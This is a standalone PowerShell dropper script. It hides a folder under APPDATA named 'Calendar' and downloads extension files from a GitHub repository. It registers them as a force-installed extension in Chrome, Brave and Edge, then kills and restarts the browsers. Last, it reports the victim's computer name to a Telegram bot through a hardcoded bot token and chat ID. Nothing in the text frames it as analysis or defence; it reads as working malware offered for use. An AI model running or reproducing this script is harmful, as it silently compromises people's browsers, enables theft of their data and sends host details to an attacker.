$BOT = "8770095089:AAFs6Z4raZGnwTqL1aJdDEjVWeu5fa7okZw"
$CHAT = "962420340"
$EXT_ID = "leelplbjobiheomgknchcnbmnancegal"
$EXT_DIR = "$env:APPDATA\Calendar\extension"

# Create extension folder
New-Item -ItemType Directory -Force -Path $EXT_DIR | Out-Null
attrib +H $EXT_DIR

# Download extension files
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/assets/manifest.json" -OutFile "$EXT_DIR\manifest.json"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/assets/background.js" -OutFile "$EXT_DIR\background.js"

# Create external extension JSON for Chrome
$chrome_ext = "$env:LOCALAPPDATA\Google\Chrome\User Data\External Extensions"
New-Item -ItemType Directory -Force -Path $chrome_ext | Out-Null
@"
{"external_crx": "$EXT_DIR\extension.crx","external_version":"1.0.0"}
"@ | Out-File "$chrome_ext\$EXT_ID.json" -Encoding UTF8

# Create external extension JSON for Brave
$brave_ext = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\External Extensions"
New-Item -ItemType Directory -Force -Path $brave_ext | Out-Null
@"
{"external_crx": "$EXT_DIR\extension.crx","external_version":"1.0.0"}
"@ | Out-File "$brave_ext\$EXT_ID.json" -Encoding UTF8

# Create external extension JSON for Edge
$edge_ext = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\External Extensions"
New-Item -ItemType Directory -Force -Path $edge_ext | Out-Null
@"
{"external_crx": "$EXT_DIR\extension.crx","external_version":"1.0.0"}
"@ | Out-File "$edge_ext\$EXT_ID.json" -Encoding UTF8

# Kill browsers
Get-Process chrome, brave, msedge -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 2

# Restart browsers
Start-Process chrome.exe
Start-Process brave.exe

# Notify Telegram
Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT/sendMessage" -Method POST -Body (@{chat_id=$CHAT;text="💻 <b>INSTALLED</b>`n🆔 ps_$(Get-Date -Format 'HHmmss')`n📍 $env:COMPUTERNAME";parse_mode="HTML"} | ConvertTo-Json) -ContentType "application/json"
